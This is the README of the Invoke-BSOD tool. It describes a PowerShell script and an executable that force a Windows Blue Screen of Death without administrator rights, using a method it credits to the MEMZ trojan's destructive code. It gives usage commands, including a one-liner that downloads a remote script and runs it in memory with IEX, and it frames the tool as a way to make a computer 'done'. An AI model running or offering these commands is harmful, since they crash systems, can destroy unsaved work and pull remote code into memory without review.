# Invoke-BSOD
For when you want a computer to be done - without admin!

BSOD method from here: https://github.com/Leurak/MEMZ/blob/master/WindowsTrojan/Source/Destructive/KillWindows.c#L10-L18

### Invoke-BSOD.ps1

A PowerShell script to induce a Blue Screen of Death (BSOD) without admin privileges. Also enumeartes Windows crash dump settings.

This is a standalone script, **it does not depend on any other files here.**

#### Invoke-BSOD
Invokes the Blue Screen of Death.

#### Get-DumpSettings
Returns the current crash dump settings so you'll know what type of dump you are going to generate, and where it is going to be.

Usage:
```
PS>Import-Module .\Invoke-BSOD.ps1
PS>Get-DumpSettings

  Name                           Value
  ----                           -----
  DumpFileLocation               C:\WINDOWS\MEMORY.DMP
  OverwritePrevious              True
  AutoReboot                     True
  AutoDeleteWhenLowSpace         False
  SystemLogEvent                 True
  CrashDumpMode                  Automatic Memory Dump
  
PS>Invoke-BSOD
```
OR...
```
PS>IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1'));Invoke-BSOD
```
### BSOD.exe

A compiled executable that also creates a Blue Screen of Death.

Useful when you don't have PowerShell?

### Program.cs

The C# source behind BSOD.exe
